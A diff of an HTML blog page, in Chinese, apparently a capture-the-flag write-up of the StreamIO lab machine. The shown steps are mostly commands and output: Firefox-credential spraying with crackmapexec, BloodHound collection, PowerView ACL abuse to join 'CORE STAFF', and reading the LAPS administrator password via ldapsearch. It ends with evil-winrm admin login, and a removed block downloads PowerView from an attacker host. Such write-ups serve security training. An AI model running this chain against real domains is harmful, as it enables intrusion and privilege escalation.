-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>firepwn<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>将账号密码提取出来单独存放。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>firepwn<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ cat firefox_creds | awk -F <span style="color:#e6db74">&#34;&#39;&#34;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span> | tee fire_users
 </span></span><span style="display:flex;"><span>admin
 </span></span><span style="display:flex;"><span>nikk37
@@ -1417,7 +1467,8 @@
 </span></span><span style="display:flex;"><span>n1kk1sd0p3t00:<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>paddpadd@12
 </span></span><span style="display:flex;"><span>password@12
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>使用 crackmapexec 进行 smb 批量登入尝试。用户 <code>yoshihide:password@12</code> 可以登入 smb。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ crackmapexec smb streamio.htb -u fire_users -p fire_pass --continue-on-success
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:streamIO.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> streamIO.htb<span style="color:#ae81ff">\a</span>dmin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
@@ -1436,7 +1487,8 @@
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> streamIO.htb<span style="color:#ae81ff">\J</span>Dgodd:n1kk1sd0p3t00:<span style="color:#f92672">)</span> STATUS_LOGON_FAILURE 
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> streamIO.htb<span style="color:#ae81ff">\J</span>Dgodd:paddpadd@12 STATUS_LOGON_FAILURE 
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> streamIO.htb<span style="color:#ae81ff">\J</span>Dgodd:password@12 STATUS_LOGON_FAILURE
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>进行 winrm 批量登入尝试，均失败。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ crackmapexec winrm streamio.htb -u fire_users -p fire_pass --continue-on-success
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:streamIO.htb<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>HTTP        watch.streamIO.htb <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> http://watch.streamIO.htb:5985/wsman
@@ -1488,7 +1540,8 @@
 </span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
 </span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>WINRM       watch.streamIO.htb <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> streamIO.htb<span style="color:#ae81ff">\J</span>Dgodd:password@12
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>登入 smb 未发现有价值的内容。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ smbmap -H streamio.htb -u JDgodd -p <span style="color:#e6db74">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span>                      
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
@@ -1514,7 +1567,18 @@
 </span></span><span style="display:flex;"><span>        NETLOGON                                                READ ONLY       Logon server share 
 </span></span><span style="display:flex;"><span>        SYSVOL                                                  READ ONLY       Logon server share 
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h3 id="bloodhound-渗透">bloodhound 渗透</h3>
+<p>使用 bloodhound 进行信息收集。</p>
+<ul>
+<li>domains 为 1，结构简单</li>
+<li>computers 为 1，只有一台 DC 机器</li>
+<li>users 用户为 8</li>
+<li>groups 数量为 54</li>
+<li>gpos 为 4，存在组策略</li>
+<li>ous 为 1</li>
+<li>trusts 为 0，无域信任关系</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ bloodhound-python -c All -u jdgodd -p <span style="color:#e6db74">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> -ns 10.129.12.116 -d streamio.htb -dc streamio.htb --zip                                                                        
 </span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>INFO: Found AD domain: streamio.htb
@@ -1588,52 +1652,74 @@
 <p><img src="Pasted%20image%2020260401150951.png" alt=""></p>
 <p>搜索 <code>STREAMIO.HTB</code>，有数据返回，已经成功导入。</p>
 <p><img src="Pasted%20image%2020260401151334.png" alt=""></p>
-<p>使用 <code>Add to Owned</code> 添加用户。</p>
+<p>使用 <code>Add to Owned</code> 将 <code>jdgodd</code> 添加用户。</p>
 <p><img src="Pasted%20image%2020260401153329.png" alt=""></p>
 <p>选择 <code>Shortest Path fron Owned Object</code>。</p>
 <p><img src="Pasted%20image%2020260401153947.png" alt=""></p>
 <p>将 <code>DC</code> 设置为 <code>ending node</code>。</p>
 <p><img src="Pasted%20image%2020260401154337.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ la -lish PowerView.ps1 
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2782461</span> 756K -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 753K Apr  <span style="color:#ae81ff">2</span> 09:19 PowerView.ps1
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata&gt; powershell -c wget http://10.10.16.58/PowerView.ps1 -outfile PowerView.ps1
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata&gt; dir
+<p>点击具体路径查看做法。</p>
+<p><img src="Pasted%20image%2020260405195733.png" alt=""></p>
+<h4 id="获取-writeowner">获取 WriteOwner</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\D</span>ocuments&gt; $SecPassword <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\D</span>ocuments&gt; $Cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;streamio\jdgodd&#39;</span>, $SecPassword<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; . C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps<span style="color:#ae81ff">\P</span>owerView.ps1
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; Set-DomainObjectOwner -Credential $Cred -Identity <span style="color:#e6db74">&#39;CORE STAFF&#39;</span> -OwnerIdentity jdgodd
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity <span style="color:#e6db74">&#39;CORE STAFF&#39;</span> -PrincipalIdentity jdgodd -Rights All
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; Add-DomainGroupMember -Credential $Cred -Identity <span style="color:#e6db74">&#39;CORE STAFF&#39;</span> -Members jdgodd
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; Get-DomainGroupMember -Identity <span style="color:#e6db74">&#39;CORE STAFF&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\p</span>rogramdata
+</span></span><span style="display:flex;"><span>GroupDomain             : streamIO.htb
+</span></span><span style="display:flex;"><span>GroupName               : CORE STAFF
+</span></span><span style="display:flex;"><span>GroupDistinguishedName  : CN<span style="color:#f92672">=</span>CORE STAFF,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>streamIO,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>MemberDomain            : streamIO.htb
+</span></span><span style="display:flex;"><span>MemberName              : JDgodd
+</span></span><span style="display:flex;"><span>MemberDistinguishedName : CN<span style="color:#f92672">=</span>JDgodd,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>streamIO,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>MemberObjectClass       : user
+</span></span><span style="display:flex;"><span>MemberSID               : S-1-5-21-1470860369-1569627196-4264678630-1104
+</span></span></code></pre></div><h4 id="获取-owns">获取 Owns</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; $SecPassword <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; $Cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;streamio\jdgodd&#39;</span>, $SecPassword<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity <span style="color:#e6db74">&#39;CORE STAFF&#39;</span> -Rights WriteMembers
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\D</span>ocuments&gt; Get-DomainGroupMember -Identity <span style="color:#e6db74">&#39;CORE STAFF&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
-</span></span><span style="display:flex;"><span>----                -------------         ------ ----
-</span></span><span style="display:flex;"><span>d---s-        3/28/2022   2:53 PM                Microsoft
-</span></span><span style="display:flex;"><span>d-----        2/25/2022  11:17 PM                Mozilla-1de4eec8-1241-4177-a864-e594e8d1fb38
-</span></span><span style="display:flex;"><span>d-----        3/28/2022   2:53 PM                Package Cache
-</span></span><span style="display:flex;"><span>d-----         5/9/2022   6:03 PM                regid.1991-06.com.microsoft
-</span></span><span style="display:flex;"><span>d-----        9/15/2018  12:19 AM                SoftwareDistribution
-</span></span><span style="display:flex;"><span>d-----        3/28/2022   4:46 PM                ssh
-</span></span><span style="display:flex;"><span>d-----        2/22/2022   1:34 AM                USOPrivate
-</span></span><span style="display:flex;"><span>d-----        2/22/2022   1:34 AM                USOShared
-</span></span><span style="display:flex;"><span>d-----        2/22/2022   1:35 AM                VMware
-</span></span><span style="display:flex;"><span>-a----         4/2/2026   1:23 PM         <span style="color:#ae81ff">770279</span> PowerView.ps1
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata&gt; .<span style="color:#ae81ff">\P</span>owerView.ps1
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata&gt; $pass <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> -AsPlainText -Force
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata&gt; $cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;streamio.htb\JDgodd&#39;</span>,$pass<span style="color:#f92672">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata&gt; Import-Module .<span style="color:#ae81ff">\P</span>owerView.ps1
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata&gt;  Add-DomainObjectAcl -Credential $cred -TargetIdentity <span style="color:#e6db74">&#34;Core Staff&#34;</span> -PrincipalIdentity <span style="color:#e6db74">&#34;streamio\JDgodd&#34;</span>
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata&gt; Add-DomainGroupMember -Credential $cred -Identity <span style="color:#e6db74">&#34;Core Staff&#34;</span> -Members <span style="color:#e6db74">&#34;StreamIO\JDgodd&#34;</span>
+</span></span><span style="display:flex;"><span>GroupDomain             : streamIO.htb
+</span></span><span style="display:flex;"><span>GroupName               : CORE STAFF
+</span></span><span style="display:flex;"><span>GroupDistinguishedName  : CN<span style="color:#f92672">=</span>CORE STAFF,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>streamIO,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>MemberDomain            : streamIO.htb
+</span></span><span style="display:flex;"><span>MemberName              : JDgodd
+</span></span><span style="display:flex;"><span>MemberDistinguishedName : CN<span style="color:#f92672">=</span>JDgodd,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>streamIO,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>MemberObjectClass       : user
+</span></span><span style="display:flex;"><span>MemberSID               : S-1-5-21-1470860369-1569627196-4264678630-1104
+</span></span></code></pre></div><h4 id="获取-readlapspassword">获取 ReadLAPSPassword</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\D</span>ocuments&gt; Get-DomainComputer DC -Properties <span style="color:#e6db74">&#34;cn&#34;</span>,<span style="color:#e6db74">&#34;ms-mcs-admpwd&#34;</span>,<span style="color:#e6db74">&#34;ms-mcs-admpwdexpirationtime&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cn ms-mcs-admpwdexpirationtime
+</span></span><span style="display:flex;"><span>-- ---------------------------
+</span></span><span style="display:flex;"><span>DC          <span style="color:#ae81ff">134199755942461512</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ ldapsearch -H ldap://10.129.13.8 -b <span style="color:#e6db74">&#39;DC=streamIO,DC=htb&#39;</span> -x -D JDgodd@streamio.htb -w <span style="color:#e6db74">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> <span style="color:#e6db74">&#34;(ms-MCS-AdmPwd=*)&#34;</span> ms-MCS-AdmPwds
+</span></span><span style="display:flex;"><span>└─$ ldapsearch -x -H ldap://10.129.15.25 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -D <span style="color:#e6db74">&#39;jdgodd@streamio.htb&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -w <span style="color:#e6db74">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -b <span style="color:#e6db74">&#39;DC=streamio,DC=htb&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;(cn=DC)&#39;</span> ms-mcs-admpwd
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># extended LDIF</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># LDAPv3</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># base &lt;DC=streamIO,DC=htb&gt; with scope subtree</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># filter: (ms-MCS-AdmPwd=*)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># requesting: ms-MCS-AdmPwds </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># base &lt;DC=streamio,DC=htb&gt; with scope subtree</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># filter: (cn=DC)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># requesting: ms-mcs-admpwd </span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># DC, Domain Controllers, streamIO.htb</span>
 </span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>DC,OU<span style="color:#f92672">=</span>Domain Controllers,DC<span style="color:#f92672">=</span>streamIO,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>ms-Mcs-AdmPwd: 6d0aX1<span style="color:#f92672">[</span>6d/x;<span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># DC, Topology, Domain System Volume, DFSR-GlobalSettings, System, streamIO.htb</span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>DC,CN<span style="color:#f92672">=</span>Topology,CN<span style="color:#f92672">=</span>Domain System Volume,CN<span style="color:#f92672">=</span>DFSR-GlobalSettings,CN<span style="color:#f92672">=</span>System
+</span></span><span style="display:flex;"><span> ,DC<span style="color:#f92672">=</span>streamIO,DC<span style="color:#f92672">=</span>htb
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># search reference</span>
 </span></span><span style="display:flex;"><span>ref: ldap://ForestDnsZones.streamIO.htb/DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>streamIO,DC<span style="color:#f92672">=</span>htb
@@ -1648,10 +1734,43 @@
 </span></span><span style="display:flex;"><span>search: <span style="color:#ae81ff">2</span>
 </span></span><span style="display:flex;"><span>result: <span style="color:#ae81ff">0</span> Success
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># numResponses: 5</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># numEntries: 1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numResponses: 6</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numEntries: 2</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># numReferences: 3</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"></code></pre></div>
+</span></span></code></pre></div><p>得到 <code>administrator</code> 的密码是 <code>6d0aX1[6d/x;30</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.15.25 -u administrator -p <span style="color:#e6db74">&#39;6d0aX1[6d/x;30&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>streamio<span style="color:#ae81ff">\a</span>dministrator
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; gci c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\ </span>-Filter *.txt -File -Recurse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\M</span>artin<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
